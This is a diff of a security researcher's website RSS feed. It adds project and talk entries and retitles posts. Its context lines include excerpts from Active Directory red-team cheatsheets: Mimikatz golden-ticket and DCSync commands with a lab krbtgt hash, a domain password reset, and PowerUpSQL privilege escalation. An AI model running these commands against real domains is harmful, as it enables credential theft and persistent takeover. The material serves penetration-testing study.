@@ -1,4 +1,5 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Giovanni Pecoraro</title><link>https://www.peco602.com/</link><atom:link href="https://www.peco602.com/index.xml" rel="self" type="application/rss+xml"/><description>Giovanni Pecoraro</description><generator>Wowchemy (https://wowchemy.com)</generator><language>en-us</language><lastBuildDate>Fri, 04 Nov 2022 00:00:00 +0000</lastBuildDate><image><url>https://www.peco602.com/media/icon_hu0b7a4cb9992c9ac0e91bd28ffd38dd00_9727_512x512_fill_lanczos_center_3.png</url><title>Giovanni Pecoraro</title><link>https://www.peco602.com/</link></image><item><title>Markerless radio frequency indoor monitoring for telemedicine: gait analysis, indoor positioning, fall detection, tremor analysis, vital signs and sleep monitoring</title><link>https://www.peco602.com/publication/0090-markerless-rf-monitoring-telemedicine/</link><pubDate>Fri, 04 Nov 2022 00:00:00 +0000</pubDate><guid>https://www.peco602.com/publication/0090-markerless-rf-monitoring-telemedicine/</guid><description>&lt;div class="alert alert-note">
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Giovanni Pecoraro</title><link>https://www.peco602.com/</link><atom:link href="https://www.peco602.com/index.xml" rel="self" type="application/rss+xml"/><description>Giovanni Pecoraro</description><generator>Wowchemy (https://wowchemy.com)</generator><language>en-us</language><lastBuildDate>Fri, 04 Nov 2022 00:00:00 +0000</lastBuildDate><image><url>https://www.peco602.com/media/icon_hu0b7a4cb9992c9ac0e91bd28ffd38dd00_9727_512x512_fill_lanczos_center_3.png</url><title>Giovanni Pecoraro</title><link>https://www.peco602.com/</link></image><item><title>Markerless radio frequency indoor monitoring for telemedicine: gait analysis, indoor positioning, fall detection, tremor analysis, vital signs and sleep monitoring</title><link>https://www.peco602.com/publication/0090-markerless-rf-monitoring-telemedicine/</link><pubDate>Fri, 04 Nov 2022 00:00:00 +0000</pubDate><guid>https://www.peco602.com/publication/0090-markerless-rf-monitoring-telemedicine/</guid><description>&lt;!--
+&lt;div class="alert alert-note">
 &lt;div>
 Click the &lt;em>Cite&lt;/em> button above to demo the feature to enable visitors to import publication metadata into their reference management software.
 &lt;/div>
@@ -8,7 +9,8 @@ Click the &lt;em>Cite&lt;/em> button above to demo the feature to enable visitor
 Create your slides in Markdown - click the &lt;em>Slides&lt;/em> button to check out the example.
 &lt;/div>
 &lt;/div>
-&lt;p>Supplementary notes can be added here, including &lt;a href="https://wowchemy.com/docs/writing-markdown-latex/" target="_blank" rel="noopener">code, math, and images&lt;/a>.&lt;/p></description></item><item><title>Windows Management Instrumentation cheatsheet</title><link>https://www.peco602.com/post/0080-wmi-cheatsheet/</link><pubDate>Thu, 29 Sep 2022 00:00:00 +0000</pubDate><guid>https://www.peco602.com/post/0080-wmi-cheatsheet/</guid><description>&lt;p>Windows Management Instrumentation (WMI) is Microsoft&amp;rsquo;s implementation of Common Information Model (CIM) and Web-Based Enterprise Management (WBEM). WMI provides a unique interface for applications/scripts to manage a local or remote network or computer.&lt;/p>
+Supplementary notes can be added here, including [code, math, and images](https://wowchemy.com/docs/writing-markdown-latex/).
+--></description></item><item><title>Windows Management Instrumentation cheatsheet</title><link>https://www.peco602.com/post/0080-wmi-cheatsheet/</link><pubDate>Thu, 29 Sep 2022 00:00:00 +0000</pubDate><guid>https://www.peco602.com/post/0080-wmi-cheatsheet/</guid><description>&lt;p>Windows Management Instrumentation (WMI) is Microsoft&amp;rsquo;s implementation of Common Information Model (CIM) and Web-Based Enterprise Management (WBEM). WMI provides a unique interface for applications/scripts to manage a local or remote network or computer.&lt;/p>
 &lt;p>WMI can be used for Red/Blue Teaming because:&lt;/p>
 &lt;ul>
 &lt;li>it is enabled on all Windows systems by default;&lt;/li>
@@ -1928,8 +1930,8 @@ WMI uses DCOM on port 135 (Winmgmt service) and it is not firewall and NAT frien
 &lt;li>&lt;a href="http://www.labofapenetrationtester.com/2017/03/using-sql-server-for-attacking-forest-trust.html" target="_blank" rel="noopener">Using SQL Server for attacking forest trusts&lt;/a>&lt;/li>
 &lt;li>&lt;a href="https://blog.netspi.com/decrypting-mssql-database-link-server-passwords/" target="_blank" rel="noopener">Decrypting database link server passwords&lt;/a>&lt;/li>
 &lt;/ul>
-&lt;hr></description></item><item><title>Across Forests Cheatsheet</title><link>https://www.peco602.com/post/0060-across-forests-cheatsheet/</link><pubDate>Thu, 15 Sep 2022 00:00:00 +0000</pubDate><guid>https://www.peco602.com/post/0060-across-forests-cheatsheet/</guid><description>&lt;h2 id="using-trust-tickets">Using Trust Tickets&lt;/h2>
-&lt;p>Trust relationship across forests needs to be established (are not implicit) since a forest is a security boundary. We can only access resources and/or services that have been shared with the domain we have compromised (our source domain). Use e.g. BloodHound to look for foreign group memberships between forests.&lt;/p>
+&lt;hr></description></item><item><title>Across Forests cheatsheet</title><link>https://www.peco602.com/post/0060-across-forests-cheatsheet/</link><pubDate>Thu, 15 Sep 2022 00:00:00 +0000</pubDate><guid>https://www.peco602.com/post/0060-across-forests-cheatsheet/</guid><description>&lt;h2 id="using-trust-tickets">Using Trust Tickets&lt;/h2>
+&lt;p>Trust relationship across forests needs to be established (are not implicit) since a forest is a security boundary. We can only access resources and/or services that have been shared with the domain we have compromised (our source domain). Use e.g BloodHound to look for foreign group memberships between forests.&lt;/p>
 &lt;ol>
 &lt;li>
 &lt;p>Once again, we require the trust key for the inter-forest trust:&lt;/p>
@@ -1995,7 +1997,7 @@ WMI uses DCOM on port 135 (Winmgmt service) and it is not firewall and NAT frien
 &lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Set-DomainUserPassword&lt;/span> &lt;span class="n">-Identity&lt;/span> &lt;span class="n">STUDENT3&lt;/span> &lt;span class="n">-AccountPassword&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nb">ConvertTo-SecureString&lt;/span> &lt;span class="s2">&amp;#34;Password@123&amp;#34;&lt;/span> &lt;span class="err">–&lt;/span>&lt;span class="n">AsPlainText&lt;/span> &lt;span class="n">-Force&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">-Domain&lt;/span> &lt;span class="n">evilcorp&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">local&lt;/span> &lt;span class="n">-Verbose&lt;/span>
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
 &lt;/ol>
-&lt;hr></description></item><item><title>Across Domain Trusts Cheatsheet</title><link>https://www.peco602.com/post/0050-across-domain-trusts-cheatsheet/</link><pubDate>Thu, 08 Sep 2022 00:00:00 +0000</pubDate><guid>https://www.peco602.com/post/0050-across-domain-trusts-cheatsheet/</guid><description>&lt;p>Domains in same forest have an implicit two-way trust with other domains. There is a trust key between the parent and child domains. There are two ways of escalating privileges between two domains of same forest:&lt;/p>
+&lt;hr></description></item><item><title>Across Domain Trusts cheatsheet</title><link>https://www.peco602.com/post/0050-across-domain-trusts-cheatsheet/</link><pubDate>Thu, 08 Sep 2022 00:00:00 +0000</pubDate><guid>https://www.peco602.com/post/0050-across-domain-trusts-cheatsheet/</guid><description>&lt;p>Domains in same forest have an implicit two-way trust with other domains. There is a trust key between the parent and child domains. There are two ways of escalating privileges between two domains of same forest:&lt;/p>
 &lt;ul>
 &lt;li>Krbtgt hash&lt;/li>
 &lt;li>Trust Tickets&lt;/li>
@@ -2156,7 +2158,7 @@ WMI uses DCOM on port 135 (Winmgmt service) and it is not firewall and NAT frien
 &lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;kerberos::golden /user:[DC_NAME]$ /domain:[CURRENT_DOMAIN_FQDN] /sid:[CURRENT_DOMAIN_SID] /groups:516 /sids:[PARENT_DOMAIN_CONTROLLERS_GROUP_SID],[ENTERPRISE_DOMAIN_CONTROLLERS_GROUP_SID] /krbtgt:[KRBTGT_HASH] /ptt&amp;#34;&amp;#39;&lt;/span>
 &lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
 &lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;kerberos::golden /user:dc$ /domain:cyberlab.cybercorp.local /sid:S-1-5-211874506631-3219952063-538504511 /groups:516 /sids:S-1-521-280534878-1496970234-700767426-516,S-1-5-9 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ptt&amp;#34;&amp;#39;&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;hr></description></item><item><title>Domain Persistence Cheatsheet</title><link>https://www.peco602.com/post/0040-domain-persistence-cheatsheet/</link><pubDate>Thu, 01 Sep 2022 00:00:00 +0000</pubDate><guid>https://www.peco602.com/post/0040-domain-persistence-cheatsheet/</guid><description>&lt;p>The following techiniques require Domain Administrator privileges on the target domain.&lt;/p>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;hr></description></item><item><title>Domain Persistence cheatsheet</title><link>https://www.peco602.com/post/0040-domain-persistence-cheatsheet/</link><pubDate>Thu, 01 Sep 2022 00:00:00 +0000</pubDate><guid>https://www.peco602.com/post/0040-domain-persistence-cheatsheet/</guid><description>&lt;p>The following techiniques require Domain Administrator privileges on the target domain.&lt;/p>
 &lt;h2 id="dcsync">DCSync&lt;/h2>
 &lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">.\mimikatz.exe
 &lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mimikatz # lsadump::dcsync /domain:cyberlab.cybercorp.local /user:krbtgt
@@ -4009,7 +4011,36 @@ WMI uses DCOM on port 135 (Winmgmt service) and it is not firewall and NAT frien
 &lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLInstanceDomain&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Get-SQLServerInfoThreaded&lt;/span> &lt;span class="n">-Verbose&lt;/span>
 &lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-SQLAudit&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="n">-Instance&lt;/span> &lt;span class="s2">&amp;#34;SQLServer1\Instance1&amp;#34;&lt;/span>
 &lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-SQLEscalatePriv&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="n">-Instance&lt;/span> &lt;span class="s2">&amp;#34;SQLServer1\Instance1&amp;#34;&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;hr></description></item><item><title>RedHerd: Offensive Cyberspace Operations as a Service</title><link>https://www.peco602.com/publication/0080-redherd-offensive-operations-service/</link><pubDate>Thu, 01 Oct 2020 00:00:00 +0000</pubDate><guid>https://www.peco602.com/publication/0080-redherd-offensive-operations-service/</guid><description>&lt;!--
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;hr></description></item><item><title>RustHunter</title><link>https://www.peco602.com/project/0010-rusthunter/</link><pubDate>Sun, 15 May 2022 00:00:00 +0000</pubDate><guid>https://www.peco602.com/project/0010-rusthunter/</guid><description>&lt;p>RustHunter is a modular incident response framework to build and compare environmental baselines. It is written in Rust and uses Ansible to collect data across multiple hosts.&lt;/p>
+&lt;p>Due to the following features it can be also employed to perform threat hunting and incident handling:&lt;/p>
+&lt;ul>
+&lt;li>&lt;strong>Multi-Platform&lt;/strong>: it is able to collect data from both Windows, Linux and macOS machines;&lt;/li>
+&lt;li>&lt;strong>Agentless&lt;/strong>: the usage of the Ansible technology based on SSH and WinRM allows to overcome the requirement of a local agent waiting for a task to be accomplished;&lt;/li>
+&lt;li>&lt;strong>Easily Deployable&lt;/strong>: it is cross-platform and can be deployed both on premises and in a Cloud-based environment. A Bash and a PowerShell scripts have been developed to execute the tool respectively from a Linux and Windows machine;&lt;/li>
+&lt;li>&lt;strong>Easily Expandable&lt;/strong>: it provides developer-ready Rust specifications offering an easy way to expand the product features by writing custom modules to collect additional machine data.&lt;/li>
+&lt;/ul></description></item><item><title>Cyber range for space a way to optimize the cybersecurity process</title><link>https://www.peco602.com/talk/cyber-range-for-space-a-way-to-optimize-the-cybersecurity-process/</link><pubDate>Thu, 07 Apr 2022 14:00:00 +0000</pubDate><guid>https://www.peco602.com/talk/cyber-range-for-space-a-way-to-optimize-the-cybersecurity-process/</guid><description>&lt;!--
+&lt;div class="alert alert-note">
+&lt;div>
+Click on the &lt;strong>Slides&lt;/strong> button above to view the built-in slides feature.
+&lt;/div>
+&lt;/div>
+Slides can be added in a few ways:
+- **Create** slides using Wowchemy's [_Slides_](https://wowchemy.com/docs/managing-content/#create-slides) feature and link using `slides` parameter in the front matter of the talk file
+- **Upload** an existing slide deck to `static/` and link using `url_slides` parameter in the front matter of the talk file
+- **Embed** your slides (e.g. Google Slides) or presentation video on this page using [shortcodes](https://wowchemy.com/docs/writing-markdown-latex/).
+Further event details, including [page elements](https://wowchemy.com/docs/writing-markdown-latex/) such as image galleries, can be added to the body of this page.
+--></description></item><item><title>RedHerd Framework</title><link>https://www.peco602.com/talk/redherd-framework/</link><pubDate>Wed, 10 Nov 2021 14:00:00 +0000</pubDate><guid>https://www.peco602.com/talk/redherd-framework/</guid><description>&lt;!--
+&lt;div class="alert alert-note">
+&lt;div>
+Click on the &lt;strong>Slides&lt;/strong> button above to view the built-in slides feature.
+&lt;/div>
+&lt;/div>
+Slides can be added in a few ways:
+- **Create** slides using Wowchemy's [_Slides_](https://wowchemy.com/docs/managing-content/#create-slides) feature and link using `slides` parameter in the front matter of the talk file
+- **Upload** an existing slide deck to `static/` and link using `url_slides` parameter in the front matter of the talk file
+- **Embed** your slides (e.g. Google Slides) or presentation video on this page using [shortcodes](https://wowchemy.com/docs/writing-markdown-latex/).
+Further event details, including [page elements](https://wowchemy.com/docs/writing-markdown-latex/) such as image galleries, can be added to the body of this page.
+--></description></item><item><title>RedHerd: Offensive Cyberspace Operations as a Service</title><link>https://www.peco602.com/publication/0080-redherd-offensive-operations-service/</link><pubDate>Thu, 01 Oct 2020 00:00:00 +0000</pubDate><guid>https://www.peco602.com/publication/0080-redherd-offensive-operations-service/</guid><description>&lt;!--
 &lt;div class="alert alert-note">
 &lt;div>
 Click the &lt;em>Cite&lt;/em> button above to demo the feature to enable visitors to import publication metadata into their reference management software.
